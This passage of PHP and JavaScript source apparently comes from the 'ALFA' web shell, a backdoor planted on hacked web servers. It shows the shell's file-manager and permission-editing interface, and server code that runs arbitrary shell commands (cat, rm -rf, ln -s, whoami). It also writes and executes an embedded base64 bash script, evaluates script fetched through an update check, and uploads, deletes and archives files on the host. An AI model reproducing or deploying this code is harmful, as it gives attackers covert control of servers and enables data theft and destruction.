n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+alfa_current_fm_id;alfaloader(o,"block"),data="a="+alfab64(e)+"&c="+alfab64(t)+"&alfa1="+alfab64(a)+"&alfa2="+alfab64(i)+"&alfa3="+alfab64(l)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,r,!1,o)}function alfaPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),alfaShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification("error...!","Rename Action","error");alfaloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){alfaloader(t,"none"),alfaShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,alfaShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification(t,"Modify Action","error");alfaloader(a,"none")})}}function alfaInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+alfab64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("alfa-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("alfa_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.alfa_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+alfab64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+alfab64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&alfaCheckUrlHash()},alfaCheckUrlHash(),alfagetFlags(),rightclick_menu_context=$("rightclick_menu").style,alfaInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){alfaInitSoratableTab($("filesman_tabs_child")),alfaInitSoratableTab(d.querySelector(".editor-tabs")),alfaInitSoratableTab(d.querySelector(".options_tab")),alfaInitSoratableTab(d.querySelector(".terminal-tabs")),alfaInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
</script>
</body>
</html>
<?php
}}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
function posix_getgrgid($p) {return false;} }
function alfaWhich($p) {
$path = alfaEx('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
function alfaSize($s) {
if($s >= 1073741824)
return sprintf('%1.2f', $s / 1073741824 ). ' GB';
elseif($s >= 1048576)
return sprintf('%1.2f', $s / 1048576 ) . ' MB';
elseif($s >= 1024)
return sprintf('%1.2f', $s / 1024 ) . ' KB';
else
return $s . ' B';
}
function alfaPerms($p) {
if (($p & 0xC000) == 0xC000)$i = 's​';
elseif (($p & 0xA000) == 0xA000)$i = 'l​';
elseif (($p & 0x8000) == 0x8000)$i = '-​';
elseif (($p & 0x6000) == 0x6000)$i = 'b​';
elseif (($p & 0x4000) == 0x4000)$i = 'd​';
elseif (($p & 0x2000) == 0x2000)$i = 'c​';
elseif (($p & 0x1000) == 0x1000)$i = 'p​';
else $i = 'u​';
$i .= (($p & 0x0100) ? 'r​' : '-');
$i .= (($p & 0x0080) ? 'w​' : '-');
$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's​' : 'x​' ) : (($p & 0x0800) ? 'S​' : '-'));
$i .= (($p & 0x0020) ? 'r​' : '-');
$i .= (($p & 0x0010) ? 'w​' : '-');
$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's​' : 'x​' ) : (($p & 0x0400) ? 'S​' : '-'));
$i .= (($p & 0x0004) ? 'r​' : '-');
$i .= (($p & 0x0002) ? 'w​' : '-');
$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't​' : 'x​' ) : (($p & 0x0200) ? 'T​' : '-'));
return $i;
}
function alfaPermsColor($f,$isbash=false){
$class = "";
$num = "";
$human = "";
if($isbash){
$class = $f["class"];
$num = $f["num"];
$human = $f["human"];
}else{
$num = substr(sprintf('%o', @fileperms($f)),-4);
$human = alfaPerms(@fileperms($f));
if(!@is_readable($f))
$class = "main_red_perm";
elseif (!@is_writable($f))
$class = "main_white_perm";
else
$class = "main_green_perm";
}
return '<span style="font-weight:unset;" class="'.$class.'">'.$num.'</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="'.$class.'">'.$human.'</span>';
}
if(!function_exists("scandir")) {
function scandir($dir) {
$dh = opendir($dir);
while (false !== ($filename = readdir($dh)))
$files[] = $filename;
return $files;
}
}
function reArrayFiles($file_post){
$file_ary = array();
$file_count = count($file_post['name']);
$file_keys = array_keys($file_post);
for ($i=0; $i<$file_count; $i++) {
foreach ($file_keys as $key) {
$file_ary[$i][$key] = $file_post[$key][$i];
}
}
return $file_ary;
}
function _alfa_can_runCommand($cgi=true,$cache=true){
	if(isset($_COOKIE["alfa_canruncmd"])&&$cache){
		return true;
	}
	if(strlen(alfaEx("whoami",false,$cgi))>0){
		$_COOKIE["alfa_canruncmd"] = true;
		return true;
	}
	return false;
}
function _alfa_symlink($target, $link){
	$phpsym = function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
		alfaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
	}
}
function _alfa_file_exists($file,$cgi=true){
	if(@file_exists($file)){
		return true;
	}else{
		if(strlen(alfaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
			return true;
		}
	}
	return false;
}
function _alfa_file($file,$cgi=true){
	$array = @file($file);
	if(!$array){
		if(strlen(alfaEx("id",false,$cgi))>0){
			$data = alfaEx('cat "'.addslashes($file).'"',false,$cgi);
			if(strlen($data)>0){
				return explode("\n", $data);
			}else{
				return false;
			}
		}else{
			return false;
		}
	}else{
		return $array;
	}
}
function _alfa_is_writable($file){
	$check = false;
	$check = @is_writable($file);
	if(!$check){
		if(_alfa_can_runCommand()){
			$check = alfaEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				$check = true;
			}else{
				$check = false;
			}
		}
	}
	return $check;
}
function _alfa_is_dir($dir,$mode="-d"){
	$check = false;
	$check = @is_dir($dir);
	if($mode == "-e"){
		$check = @is_file($dir);
	}
	if(!$check){
		if(_alfa_can_runCommand()){
			$check = alfaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				return true;
			}else{
				return false;
			}
		}
	}
	return $check;
}
function _alfa_load_ace_options($base){
	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
}
function alfaFilesMan2(){
	alfahead();
	AlfaNum(8,9,10,7,6,5,4);
	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
	alfaFooter();
}
function copy_paste($c,$s,$d){
if(@is_dir($c.$s)){
@mkdir($d.$s);
$h = @opendir($c.$s);
while (($f = @readdir($h)) !== false)
if (($f != ".") and ($f != ".."))
copy_paste($c.$s.'/',$f, $d.$s.'/');
} elseif(is_file($c.$s))
@copy($c.$s, $d.$s);
}
function alfaFilesMan(){
if(!empty ($_COOKIE['alfa_f']))
$_COOKIE['alfa_f'] = @unserialize($_COOKIE['alfa_f']);
if(!empty($_POST['alfa1'])){
switch($_POST['alfa1']){
case 'uploadFile':
$move_cmd_file = false;
$alfa_canruncmd = false;
if($GLOBALS['glob_chdir_false']){
	$alfa_canruncmd = _alfa_can_runCommand(true,true);
	$move_cmd_file = true;
}
if(_alfa_is_writable($GLOBALS['cwd'])){
$files = reArrayFiles($_FILES['f']);
$ret_files = array();
foreach($files as $file){
if($move_cmd_file&&$alfa_canruncmd){
	alfaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
		$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
		$file_perm = alfaPermsColor($file['name']);
		$file_size = @filesize($file['name']);
		$ret_files[] = array("name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
	}
}
}
if(!$move_cmd_file){
	echo json_encode($ret_files);
}
}else{
	echo "noperm";
	return;
}
if(!$move_cmd_file){
return;
}
break;
case 'mkdir':
$new_dir_cmd = false;
if($GLOBALS['glob_chdir_false']){
	if(_alfa_can_runCommand(true,true)){
		if(_alfa_is_writable($GLOBALS['cwd'])){
			if(!_alfa_is_dir(trim($_POST['alfa2']))){
				alfaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
			}else{
				echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
			}
		}else{
			echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
	}
}else{
	if(_alfa_is_writable($GLOBALS['cwd'])){
		if(!_alfa_is_dir(trim($_POST['alfa2']))){
			if(!@mkdir(trim($_POST['alfa2']))){
				echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
			}else{
				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
			}
		}else{
			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";}
	}else{
		echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
	}
}
break;
case 'delete':
function deleteDir($path){
$path = (substr($path,-1)=='/') ? $path:$path.'/';
$dh = @opendir($path);
while(($item = @readdir($dh)) !== false){
$item = $path.$item;
if((basename($item) == "..") || (basename($item) == "."))
continue;
$type = @filetype($item);
if ($type == "dir")
deleteDir($item);
else
@unlink($item);
}
@closedir($dh);
@rmdir($path);
}
if(is_array(@$_POST['f']))
foreach($_POST['f'] as $f){
if($f == '..')
continue;
$f = rawurldecode($f);
if($GLOBALS["glob_chdir_false"]){
	if(_alfa_can_runCommand(true,true)){
		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
	}
}else{
alfaEx("rm -rf '".addslashes($f)."'",false,false);
if(@is_dir($f))
deleteDir($f);
else
@unlink($f);
}
}
if(@is_dir(rawurldecode(@$_POST['alfa2']))&&rawurldecode(@$_POST['alfa2'])!='..'){
deleteDir(rawurldecode(@$_POST['alfa2']));
alfaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
}else{
@unlink(rawurldecode(@$_POST['alfa2']));
}
if($GLOBALS["glob_chdir_false"]){
	$source = rawurldecode(@$_POST['alfa2']);
	if($source!='..'&&!empty($source)){
		if(_alfa_can_runCommand(true,true)){
			alfaEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
if(is_array($_POST['f']))
return;
break;
case 'paste':
if($_COOKIE['alfa_act'] == 'copy'&&isset($_COOKIE['alfa_f'])){
foreach($_COOKIE['alfa_f'] as $f)
copy_paste($_COOKIE['alfa_c'],$f, $GLOBALS['cwd']);
}elseif($_COOKIE['alfa_act'] == 'move'&&isset($_COOKIE['alfa_f'])){
function move_paste($c,$s,$d){
if(@is_dir($c.$s)){
@mkdir($d.$s);
$h = @opendir($c.$s);
while (($f = @readdir($h)) !== false)
if(($f != ".") and ($f != ".."))
copy_paste($c.$s.'/',$f, $d.$s.'/');
}elseif(@is_file($c.$s))
@copy($c.$s, $d.$s);
}
foreach($_COOKIE['alfa_f'] as $f)
@rename($_COOKIE['alfa_c'].$f, $GLOBALS['cwd'].$f);
}elseif($_COOKIE['alfa_act'] == 'zip'&&isset($_COOKIE['alfa_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
$zipX = "alfa_".rand(1,1000).".zip";
if($zip->open($zipX, 1)){
@chdir($_COOKIE['alfa_c']);
foreach($_COOKIE['alfa_f'] as $f){
if($f == '..')continue;
if(@is_file($_COOKIE['alfa_c'].$f))
$zip->addFile($_COOKIE['alfa_c'].$f, $f);
elseif(@is_dir($_COOKIE['alfa_c'].$f)){
$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
foreach($iterator as $key=>$value){
$key = str_replace('\\','/',realpath($key));
if(@is_dir($key)){
if(in_array(substr($key, strrpos($key,'/')+1),array('.', '..')))continue;
}else{$zip->addFile($key,$key);}}}}
@chdir($GLOBALS['cwd']);
$zip->close();
__alert('>> '.$zipX.' << is created...');}}
}elseif($_COOKIE['alfa_act'] == 'unzip'&&isset($_COOKIE['alfa_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
foreach($_COOKIE['alfa_f'] as $f) {
if($zip->open($_COOKIE['alfa_c'].$f)){
$zip->extractTo($_COOKIE['alfa_cwd']);
$zip->close();}}}}
unset($_COOKIE['alfa_f']);
break;
default:
if(!empty($_POST['alfa1'])){
if(in_array($_POST['alfa1'], array("copy", "move", "zip", "unzip"))){
__alfa_set_cookie('alfa_act', @$_POST['alfa1']);
__alfa_set_cookie('alfa_f', @serialize($_POST['f']));
__alfa_set_cookie('alfa_c', @$_POST['c']);
return;
}
}
break;
}
}
$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
	$path = explode('/', $res[1]);
	array_pop($path);
	$_POST['c'] = implode('/', $path);
}
$cmd_dir = false;
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		$tmp_getdir_path = @$_COOKIE["alfachdir_bash_path"];
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
			$tmp_getdir_path = alfaWriteTocgiapi("getdir.alfa",$bash);
			__alfa_set_cookie("alfachdir_bash", "true");
			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
		$dirContent = json_decode($dirContent, true);
		if(is_array($dirContent)){
			array_pop($dirContent);
			$cmd_dir = true;
		}else{
			$dirContent = false;
		}
	}
}
alfahead();
AlfaNum(8,9,10,7,6,5,4);
$count_dirContent = @count($dirContent);
if($count_dirContent > 300){
	@$_COOKIE["alfa_limited_files"] = 100;
}
$alfa_sort_by = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
$alfa_limited_files = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
$alfa_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
$alfa_filesman_direction = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
$files_page_count = 1;
if($alfa_limited_files > 0){
	$files_page_count = ceil($count_dirContent/$alfa_limited_files);
	if($files_page_count > 1){
		$files_page_count++;
	}
}
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
alfaFooter();
return;
}
global $sort;
$sort = array('name', 1);
if(isset($_COOKIE["alfa_sort_by"]) && !empty($_COOKIE["alfa_sort_by"])){
	$sort[0] = $_COOKIE["alfa_sort_by"];
}
if(!empty($_POST['alfa1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $match))
$sort = array($match[1], (int)$match[2]);
}
if($alfa_files_page_number > ($files_page_count-1)){
	$alfa_files_page_number = 1;
}
$checkbox_rand = rand(11111, 99999);
echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
$dirs = $files = array();
$n = $count_dirContent;
if($n > $alfa_limited_files && $alfa_limited_files > 0){
	$n = ($alfa_limited_files * $alfa_files_page_number);
	if($n > $count_dirContent){
		$n = $count_dirContent;
	}
}
$i = 0;
if($alfa_limited_files > 0 && $alfa_files_page_number > 1){
	$i = $alfa_limited_files * ($alfa_files_page_number - 1);
}
$page_builder = get_pagination_links($alfa_files_page_number,$files_page_count -1);
$cmd_dir_backp = "";
for(;$i<$n;$i++){
if($cmd_dir){
$filename = $dirContent[$i]["name"];
$file_owner = $dirContent[$i]["owner"];
$file_group = $dirContent[$i]["group"];
$file_modify = @date('Y-m-d H:i:s', $dirContent[$i]["modify"]);
$file_perm = alfaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
$file_size = $dirContent[$i]["size"];
if(substr($dirContent[$i]["name"], 0 ,1) == "/"){
$file_path = $dirContent[$i]["name"];
$dirContent[$i]["name"] = "..";
$filename = $dirContent[$i]["name"];
}else{
$file_path = $GLOBALS['cwd']."/".$dirContent[$i]["name"];
}
}else{
$filename = $dirContent[$i];
$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$filename)):array("name" => "????");
$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($GLOBALS['cwd'].$filename)):array("name" => "????");
$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$filename):"????");
$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$filename):"????");
$file_modify = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $filename));
$file_perm = alfaPermsColor($GLOBALS['cwd'].$filename);
$file_size = @filesize($GLOBALS['cwd'].$filename);
$file_path = $GLOBALS['cwd'].$filename;
}
$tmp = array('name' => $filename,
'path' => $file_path,
'modify' => $file_modify,
'perms' => $file_perm,
'size' => $file_size,
'owner' => $file_owner,
'group' => $file_group
);
if($filename == ".." && !$cmd_dir){
	$tmp["path"] = str_replace("\\", "/", realpath($file_path));
}
if(!$cmd_dir){
if(@is_file($file_path)){
$arr_mrg = array('type' => 'file');
if(@is_link($file_path)){
$arr_mrg["link"] = readlink($tmp['path']);
}
$files[] = array_merge($tmp, $arr_mrg);
}elseif(@is_link($file_path)){
$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
}elseif(@is_dir($file_path)&& ($filename != ".")){
$dirs[] = array_merge($tmp, array('type' => 'dir'));
}
}else{
